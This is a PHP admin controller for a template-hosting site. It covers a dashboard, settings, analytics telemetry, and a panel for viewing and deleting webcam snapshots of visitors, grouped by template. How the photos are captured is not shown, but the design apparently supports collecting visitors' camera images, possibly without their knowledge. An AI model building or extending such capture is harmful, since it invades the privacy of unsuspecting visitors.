<?php
namespace App\Controllers;

use App\Models\Analytics;
use App\Models\Settings;
use App\Models\Category;

class AdminController extends Controller {
    public function __construct() {
        // Enforce login for all admin routes
        $this->requireAuth();
    }

    /**
     * Show the main admin dashboard screen.
     */
    public function dashboard() {
        $analyticsModel = new Analytics();
        
        $stats = $analyticsModel->getSummaryStats();
        $popularTemplates = $analyticsModel->getMostPopularTemplates(5);
        $recentViews = $analyticsModel->getRecentlyViewed(5);
        $viewsHistory = $analyticsModel->getViewsOverTime(7);

        $this->render('admin/dashboard', [
            'title' => 'Dashboard Overview',
            'active_page' => 'dashboard',
            'stats' => $stats,
            'popular_templates' => $popularTemplates,
            'recent_views' => $recentViews,
            'views_history' => $viewsHistory
        ]);
    }

    /**
     * Show global settings panel.
     */
    public function settings() {
        $settingsModel = new Settings();
        $categoryModel = new Category();

        $settings = $settingsModel->getAll();
        $categories = $categoryModel->getAll();

        $this->render('admin/settings', [
            'title' => 'General Settings',
            'active_page' => 'settings',
            'settings' => $settings,
            'categories' => $categories
        ]);
    }

    /**
     * Process save request for settings.
     */
    public function saveSettings() {
        $this->validateCsrf();

        $settingsModel = new Settings();
        $categoryModel = new Category();

        // Update basic site configs
        if (isset($_POST['site_name'])) {
            $settingsModel->set('site_name', trim($_POST['site_name']));
        }
        if (isset($_POST['admin_email'])) {
            $settingsModel->set('admin_email', trim($_POST['admin_email']));
        }
        if (isset($_POST['custom_css'])) {
            $settingsModel->set('custom_css', $_POST['custom_css']);
        }

        // Add new Category if submitted
        $newCatName = trim($_POST['new_category_name'] ?? '');
        if (!empty($newCatName)) {
            $slug = strtolower(preg_replace('/[^A-Za-z0-9-]+/', '-', $newCatName));
            $slug = trim($slug, '-');
            
            // Check if slug is unique
            if (!$categoryModel->getBySlug($slug)) {
                $categoryModel->create($newCatName, $slug);
                $this->setFlash('success', "Category '{$newCatName}' created successfully!");
            } else {
                $this->setFlash('error', "Category '{$newCatName}' already exists.");
            }
        } else {
            $this->setFlash('success', 'Global settings updated successfully.');
        }

        $this->redirect('admin/settings');
    }

    /**
     * Show general analytics reporting.
     */
    public function analytics() {
        $analyticsModel = new Analytics();
        
        $stats = $analyticsModel->getSummaryStats();
        $popularTemplates = $analyticsModel->getMostPopularTemplates(10);
        $recentViews = $analyticsModel->getRecentlyViewed(20);
        $viewsHistory = $analyticsModel->getViewsOverTime(30);

        $this->render('admin/analytics', [
            'title' => 'Analytics Telemetry',
            'active_page' => 'analytics',
            'stats' => $stats,
            'popular_templates' => $popularTemplates,
            'recent_views' => $recentViews,
            'views_history' => $viewsHistory
        ]);
    }

    /**
     * Show visitor webcam photo snapshots dashboard.
     */
    public function photos() {
        $db = \App\Config\Database::getConnection();
        
        // Fetch visitor photos and templates info
        $sql = "SELECT p.*, t.title as template_title, t.slug as template_slug 
                FROM visitor_photos p 
                JOIN templates t ON p.template_id = t.id 
                ORDER BY p.created_at DESC";
        $stmt = $db->query($sql);
        $photos = $stmt->fetchAll(\PDO::FETCH_ASSOC);

        // Group photos by template slug
        $groupedPhotos = [];
        foreach ($photos as $photo) {
            $key = $photo['template_slug'];
            if (!isset($groupedPhotos[$key])) {
                $groupedPhotos[$key] = [
                    'title' => $photo['template_title'],
                    'slug' => $photo['template_slug'],
                    'items' => []
                ];
            }
            $groupedPhotos[$key]['items'][] = $photo;
        }

        $this->render('admin/photos', [
            'title' => 'Visitor Snapshots',
            'active_page' => 'photos',
            'grouped_photos' => $groupedPhotos
        ]);
    }

    /**
     * Process visitor photo deletion logs.
     */
    public function deletePhoto() {
        $this->validateCsrf();
        $id = (int)($_POST['photo_id'] ?? 0);
        
        if ($id > 0) {
            $db = \App\Config\Database::getConnection();
            
            // Query photo path to unlink file
            $stmt = $db->prepare("SELECT photo_path FROM visitor_photos WHERE id = ?");
            $stmt->execute([$id]);
            $photo = $stmt->fetch(\PDO::FETCH_ASSOC);
            
            if ($photo) {
                $filePath = APP_ROOT . '/public/' . $photo['photo_path'];
                if (file_exists($filePath)) {
                    unlink($filePath);
                }
                
                $delStmt = $db->prepare("DELETE FROM visitor_photos WHERE id = ?");
                $delStmt->execute([$id]);
                $this->setFlash('success', 'Visitor photo snapshot deleted successfully.');
            } else {
                $this->setFlash('error', 'Snapshot not found.');
            }
        } else {
            $this->setFlash('error', 'Invalid photo ID.');
        }

        $this->redirect('admin/photos');
    }
}
